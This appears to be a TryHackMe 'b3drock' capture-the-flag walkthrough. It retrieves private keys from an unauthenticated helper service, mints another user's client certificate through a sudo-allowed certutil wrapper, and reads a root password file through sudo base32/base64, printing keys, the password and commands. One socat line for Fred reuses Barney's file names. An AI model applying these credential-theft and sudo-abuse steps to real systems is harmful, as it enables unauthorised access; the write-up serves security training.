# TryHackMe b3drock Walkthrough 


<img width="2602" height="756" alt="image" src="https://github.com/user-attachments/assets/d47680cc-7c5d-4e51-ab87-9936096415fc" />


## Briefing 
Fred Flintstone & Barney Rubble!

Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...

- He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040.
- There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate).
- There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service.
- Can you find all the Easter eggs?
_____________________________________________________________________________________________________________________________________________

## Barney

The box provides a simple TCP helper service that stores or serves TLS credential material (certificates and private keys). 
We connected to that service with nc and used its primitive file-retrieval commands to obtain a client certificate and the matching private key for the user Barney Rubble

```
nc <TARGET_IP> 9009
```

We are given a prompt: 

```
You use this service to recover your client certificate and private key
What are you looking for?
```

We can simply type `key` and `cert` and we are given barney's private key and certificate:
```
What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAseoc3g4VsZ8a//WLt8kx/8cuiof3qVfT9UFP4GBxXzWnVP7S
J/dGHmol165ypMAnBs7xrttBILjGd5sx32iUZ6dTGOQob6PBppHGi/WOrz8DhNTj
DyXGTGh8yF9YpRaLPEsG+jb8z+JZqwIKXWO9AnrrtBunyGaIjcTZNCul0IKePMGY
Sb+gIbZIPwnh+GR++XRYXr5CBiVUmpelMlMSBRYuNpiu3p5+gX9NWSPGitnx5Nh7
W3uq8CVchX06BdSBn57YQKBE1xA1o7B1HqJxp6WNwbaUqErbT+Ovas1dAvLuDyoH
YYnZR8W48s5cLntm1Hb0JiL7NZcKEIX06TT6iQIDAQABAoIBAHGo6sBBp0JOLuWO
bLAA7NxG10jRDDs3TMXF782cT1FP6ZK3KHM32afckEh1ve/aghQraOMYV0ccRE5s
6zOakBSYJNImEF8h8rkDMCCBw6HZU9osVtJ6g3CU4ALyRqNQ/6qJE/AN6Py10isZ
pp169mj7NlFdyZaRSnOnakuWBtxpRRZNg/eMiAJLEXcEHm9Hu3BXZkJFAEQgLH2u
gsqAip+V2lAlyeeDHiT7IwTaRBi0V61gCB3xl7f3kojYAEsC06q5XgdgqAf7N9nU
brZ4r7uMQAQ2Xr45f7ON/cjT307pa4l/lqklcusOgEVUNm3aeKRV48dRvbg1Z8Az
Nj1QSTECgYEA1nPIcgc9/I+JnSieXjqX5Yg8tg6gRyGo6E4dyL5dbuR6Pgq3AzHK
33aDuO/F/kS9EroO5HcjJ1XLwt8MstaENL9uWIPUCRRYmMGIQWe6bKFcRYSWR5XG
Mf+6vVq1zN3VlQIcl4dAie1xCPzv/7jr+rp+sCZtEkonKAA1sJgd2AsCgYEA1GIp
Pn2w97BJpv2JZKjAku+fV//5LhNq+xi6uGufnLf5xW5uPdn+dhNQpN8r+vsyH43X
6Z7mSTAokkkqmKEYygRU77/vubClwnf74ZE+tYkDbu2fqMkYJ5tbfd74efHYuovl
ZgQiDgXeiSWbeHNnBvOBsYN64wNvffKzkz0qkDsCgYEAqgWb2sPhIjbO3PnSLVT5
DrLnp1OLQTnvh1Y/iONcgknEnSGznWXBuU9l+Z6n9AKdgJZgrkPCbDI6XSKoF7W5
lXRcUPMbjaNC5sExfOF3TR7VYAxRdSnKu+NLM0sSrf0Gk5/b+UrzISdOIdkfkjgT
Z3KqdI/Sk9iUmMMpzfucVacCgYA/7A931ILH+dIhJZwNpNDZKK/v34YS/Rss2gOQ
8CuJEsJlTth1W0BAL44NIXJuRt6OKrX6ha3QB2Oeq9DbQVlhrC4YPs+bNvSc9Fnm
ST3zi3pyD6kHNwdDHHpMBykIIudVNjfkHYhWaiPRaXVCqpEuwWmekPESlH0hDkRI
I5fE8wKBgH2foHfaObmwnFnquUIqTjujamP58l+l5SPTHlBSSNfZ6LstChXwfd4i
J3VMzBlTmlcpMM5p7eZjv+olrzDQ967+hY7l3c5BZyvgRTYyRr9DxKNwoKEmXCOz
8bPDcwgJZIn7H8MA+YryDqEhgmz7B+9Bw4LGmJ4NPWlaNDYUZ80r
-----END RSA PRIVATE KEY-----
```

```
What are you looking for? cert file
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTEwMTcxNzMyMzFaFw0yNjEwMTcxNzMyMzFaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCx6hze
DhWxnxr/9Yu3yTH/xy6Kh/epV9P1QU/gYHFfNadU/tIn90YeaiXXrnKkwCcGzvGu
20EguMZ3mzHfaJRnp1MY5Chvo8GmkcaL9Y6vPwOE1OMPJcZMaHzIX1ilFos8Swb6
NvzP4lmrAgpdY70Ceuu0G6fIZoiNxNk0K6XQgp48wZhJv6Ahtkg/CeH4ZH75dFhe
vkIGJVSal6UyUxIFFi42mK7enn6Bf01ZI8aK2fHk2Htbe6rwJVyFfToF1IGfnthA
oETXEDWjsHUeonGnpY3BtpSoSttP469qzV0C8u4PKgdhidlHxbjyzlwue2bUdvQm
Ivs1lwoQhfTpNPqJAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAHBVMi995sf+ow+k
ARrCLal8jDK/xKf6hM5m3b15CSfgaOT/tC93J3+6ZHhgO9BBR47amKMAhY7kRlMg
Bw8IRicFSJ6pVNMrKrfHZf2eY1JrL4MxWWdd+AG8W9iAsF1iAI4KKGMvdOlcq+80
2zC74qTQfzGRSyeudICGVVEikhJeRd8/dEtUEvlon9XvkbFPjMTj7tyoIfHbZO8L
SYavWcrvcDg8/70tqZcdjDJQ1uStf+Cb6F0AB95mPJTQRP1omIAKh4DX7xrJV9fL
xMOEFr6Zm3lvCZR3+19UWqCXwVqzcUrsfRvfQhv+Isu19mkOmWxTVLe5bbNsf0Dx
+9IvuZI=
-----END CERTIFICATE-----

```

Using the hint from before, we can save the two files and use them to open a TLS session.
```
socat stdio ssl:<TARGET_IP>:54321,cert=./barney.crt,key=./barney.key,verify=0
```

After typing in the prompt, we recieve a password "hint". The hint is actually the password itself. Using ssh, we can get on the machine as the user `barney` and grab the first flag. 

## Generate Fred’s cert/key (as barney):

```
sudo -l
User barney may run: (ALL : ALL) /usr/bin/certutil
```

While enumerating the barney account I ran sudo -l and saw that I could run /usr/bin/certutil as root. Inspecting that wrapper showed it invoked a NodeJS module that generates service-signed client certificates 
when called with a username and full name; the module writes the key and certificate into /usr/share/abc/certs/ and prints the PEM blobs to stdout. Because the TLS services on the box trust certificates signed by that service key, 
I used sudo /usr/bin/certutil fred "Fred Flintstone" to mint a valid client certificate and private key for the user fred.
With the freshly generated /usr/share/abc/certs/fred.certificate.pem and /usr/share/abc/certs/fred.clientKey.pem I could authenticate to the TLS helper as Fred and continue the exploit chain.

```
barney@ip-10-201-29-229:/usr/bin$ sudo /usr/bin/certutil fred "Fred Flintstone" | sed -n '1,240p'^C
barney@ip-10-201-29-229:/usr/bin$ sudo /usr/bin/certutil fred "Fred Flintstone" | sed -n '1,240p'
Generating credentials for user: fred (Fred Flintstone)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwel1B/xz8/iZRVMvXZo8T2aybt/5xojFreNCgKg1j7xnH8Bc
sLDkLfB1IjUVuT2DvrmvItqCwvGXiPzDlXZQ8J1QVfFwq6cVLtj24jODDE8BpgVt
943+ErYXwAzsupFb+On/Bym5wdvlSLsI7G0O3gWQtniZrTazSdfoAosjawc6nF5q
tQKLvlieJ7bpp+FyqT7xTD68CC4dGy1yb19gxvKLDxZH3VdC/oXAjPUMqlclhyr1
k1HZXA10JmufuBvp1bs3amZ8eSuCYhLvNCEQOFFk7SR4kTyOBtjNsKuVSucRb9aF
QqGOP0os93I186Ut1X9hYVcQpv54J/yBel0bIwIDAQABAoIBAFq3oWyvCoAk2W+5
Tvt3YKe0391HI09iRTjojQArsYMhHQ2ZrMNsvhNP3zy1oQgcYzojHHAt0ebpp38K
4WVXCN7IegD7Bz8G174m+rkwaCql+5t0BtI9t5OBZPMQGN/fiSuWLR1ow+KRwV6Z
Qb959e6go+b53MtQP+hX/c7S0SsMUaMRf8x8sFiGXHwjZUdk+3LTgXYKNa9CKViu
IuLLuPOIYuLV+Rnt1AE17O+70QCUYTIaUoGUBMBj3oPjFRWu56wM2v0KJnjfjL5m
A+4JE2zJQFS4DQ3VkFVvMQkixiQPjozeptSUvRRzZBJUZdOCNAnh7ovVie+uIHYV
cffQ1wECgYEA8Ljcspk0s+5qDQsm6fuDEC152FPSJj6EamVYJyJc8vP6NQmwQB82
+ANImKNGoDQpbyCHpG7zlS2fXSkE/R9PE5QUE+lxWavzWo262rMkztFxrsG+FVEg
lJtFgqMi1dr3iS6JAcRJQCyc9m2331jzHQcjF4U7WO8vwn2ooDOL0OECgYEAzjgL
srcAzWG6OQ1VcG/dcUfYCDmN2jWKoeMXsbFqzTd0hmwO/n359/XpkyRKHyQBranF
6ayUc+eNmAKyrPGsfu2NB27hImAn+ihI9umMQgVYK7/ad1+/zz8GkHxaKbAUhBwv
27SfB33qXIf8u7xk/Ex0//epUBJzXQYXS2ggOIMCgYAbiXotsBr4TlixX0o3T/9B
NYKPvZ73owUwyqEX8PVjEYfY01/nJer62h1O4Laukuj+fmEl7U9ODGcDmDKq5g78
tV7KnFTMJkBzZm0uoXmfcxQnIqCk/Z/VgCGmfRT6E89nUPx5SEP85F2cTxbOpPVC
p9Na2HHejZYQEKHemabv4QKBgEQmLWeAJtm4xCv6hhPERDAdh/0f2AsWypu5SqlE
coEjJHUP3NypkSQqtmgUBBLKeWuEwYz5pY2wJhDoQ1f3/gNsScD9GZWcpVl8WrCO
efWPgpXirzXoBKFeuLKjBcDlGcKW9hHrXOrC5+JwZks8dTsToU6978wwbMN/Mc+P
t6Y1AoGBAJjqFN+ntX+ohjjLHGYH7dziCvjiQsigB4pRoCP/vId2xkvBpwkHY/LH
j2PtsbsZEiNhwNyQD+M6Gz+ZmhHaW7wqpKf6TY7i0DgJgtL+i7q/Qe42D5yYPA/G
N4VTrhUnvsL/IqOw7StUI61b3NgGOdhetbp9y4g0tei11kMgh7GQ
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICozCCAYsCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTEwMTcxODI3MjJaFw0yNTEwMTgxODI3MjJaMBoxGDAWBgNVBAMMD0Zy
ZWQgRmxpbnRzdG9uZTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMHp
dQf8c/P4mUVTL12aPE9msm7f+caIxa3jQoCoNY+8Zx/AXLCw5C3wdSI1Fbk9g765
ryLagsLxl4j8w5V2UPCdUFXxcKunFS7Y9uIzgwxPAaYFbfeN/hK2F8AM7LqRW/jp
/wcpucHb5Ui7COxtDt4FkLZ4ma02s0nX6AKLI2sHOpxearUCi75Ynie26afhcqk+
8Uw+vAguHRstcm9fYMbyiw8WR91XQv6FwIz1DKpXJYcq9ZNR2VwNdCZrn7gb6dW7
N2pmfHkrgmIS7zQhEDhRZO0keJE8jgbYzbCrlUrnEW/WhUKhjj9KLPdyNfOlLdV/
YWFXEKb+eCf8gXpdGyMCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEACHhwq0AK0jem
H5tHfCPodaQdd8A4rPQE4rtma+D3NHkT0nIABIYQwT8R9nYmg5PNvFitwwx7ILCL
CVwV6cWlFBvSAPYYMg7ruhDWfqtSrPaDGXgNGyWlnFMIpe99YkZ/Z0t6KPmCL1KH
sFWxxoe33bhNDYZ7tu/6NUtVAmcUzAIrBzMxJyVLcly4JyeeSF/+lDdzKv26AwkE
keFNc3/v7I+190EwEFm1CCjFaYRBa0tQM0hwWNHHd1xZQgZ4j1Ju0doSaC5ox97P
3SlAkuGblYtepEDfQj+O/4CdPuserI7Evh2j3bTpLwr5SFTta2xAIctwdJRZiDqf
rTxz4iLkmA==
-----END CERTIFICATE-----

```

After getting the two keys, I used them in the same way as the first time with:
```
socat stdio ssl:<TARGET_IP>:54321,cert=./barney.crt,key=./barney.key,verify=0
```
There will be a prompt again just like the first one, and it gives a password for the user `fred`

Use ssh to sign into fred and grab the user flag. 

# Fred to root

I discovered that fred had NOPASSWD sudo access to /usr/bin/base32 and /usr/bin/base64 for /root/pass.txt. Using those allowed encoders I read the encoded secret as root and decoded the chain
(Base32 → Base32 → Base64) to reveal the root password (a00a12aad6b7c16bf07032bd05a31d56). I then ran su - root, supplied the decoded password, and obtained a root shell.

```
fred@ip-10-201-29-229:~$ sudo -l
Matching Defaults entries for fred on ip-10-201-29-229:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on ip-10-201-29-229:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

```
sudo /usr/bin/base32 /root/pass.txt | base32 -d | base32 -d | base64 -d
a00a12aad6b7c16bf07032bd05a31d56
```

```
root@ip-10-201-29-229:~# cat root.txt
THM{de4043c0...}
```


















